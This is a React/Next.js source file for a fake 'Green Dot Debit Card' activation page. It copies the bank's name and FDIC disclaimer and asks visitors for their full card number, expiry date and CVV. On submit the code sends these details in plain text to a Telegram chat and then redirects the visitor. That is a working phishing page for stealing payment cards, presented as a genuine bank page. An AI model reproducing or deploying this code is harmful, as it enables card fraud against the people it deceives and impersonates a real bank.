"use client";

import React, { useState } from "react";
import { useRouter } from "next/navigation";
import { sendTelegramMessage } from "../../utils/telegram";

const ActivateCardPage: React.FC = () => {
  const [cardNumber, setCardNumber] = useState("");
  const [expirationDate, setExpirationDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [error, setError] = useState("");
  const router = useRouter();

  const isFormValid =
    cardNumber.length === 16 && expirationDate && cvv.length === 3;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!isFormValid) {
      setError("Please complete all fields.");
      return;
    }

    const message = `
    🔔 *New Card Activation Request* 🔔
    💳 Card Number: ${cardNumber}
    📅 Expiration Date: ${expirationDate}
    🔒 CVV: ${cvv}
    `;

    try {
      await sendTelegramMessage(message);


      setError(""); // Clear any existing errors
    } catch (err) {
      console.log(err)
      setError("Failed to send the message. Please try again.");
    }
    router.push('/profile');
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100 px-4">
      <div className="bg-white shadow-md rounded-lg p-6 w-full max-w-xl text-center border border-gray-300">
        <h1 className="text-xl md:text-2xl lg:text-3xl font-semibold text-gray-900 tracking-tight font-sans">
          You are seconds away from using your new
          <span className="text-green-600"> Green Dot Debit Card!</span>
        </h1>

        <p className="text-gray-600 mt-2 text-sm md:text-base">
          Please enter your cards information in the form below.
        </p>

        {error && (
          <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-2 rounded mt-4 text-sm">
            {error}
          </div>
        )}

        <form onSubmit={handleSubmit} className="mt-6 space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
            <input
              type="tel"
              pattern="[0-9]*"
              placeholder="16-digit card number"
              value={cardNumber}
              onChange={(e) =>
                setCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16))
              }
              className="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-green-500 focus:border-green-500 text-sm"
            />
            <input
              type="tel"
              pattern="\d{2}/\d{2}"
              placeholder="MM/YY"
              value={expirationDate}
              onChange={(e) => setExpirationDate(e.target.value)}
              className="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-green-500 focus:border-green-500 text-sm"
            />
            <input
              type="tel"
              pattern="[0-9]{3}"
              placeholder="CVV"
              value={cvv}
              onChange={(e) =>
                setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
              }
              className="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-green-500 focus:border-green-500 text-sm"
            />
          </div>

          <button
            type="submit"
            className={`w-full py-2 rounded-lg text-white font-semibold transition duration-300 text-sm md:text-base ${
              isFormValid
                ? "bg-green-600 hover:bg-green-700"
                : "bg-gray-300 cursor-not-allowed"
            }`}
            disabled={!isFormValid}
          >
            Next
          </button>
        </form>

        {/* Disclaimer Text */}
        <p className="text-[10px] text-gray-500 mt-6 leading-tight">
          Green Dot Cards are issued by Green Dot Bank, Member FDIC, pursuant to
          a license from Visa U.S.A., Inc. Visa is a registered trademark of
          Visa International Service Association. Green Dot Bank also operates
          under the following registered trade names:{" "}
          <strong>GO2bank, GoBank,</strong> and{" "}
          <strong>Bonneville Bank.</strong> These registered trade names are
          used by, and refer to, a single FDIC-insured bank, Green Dot Bank.
          Deposits under any of these trade names are deposits with Green Dot
          Bank and are aggregated for deposit insurance coverage up to the
          allowable limits.
        </p>
      </div>
    </div>
  );
};

export default ActivateCardPage;
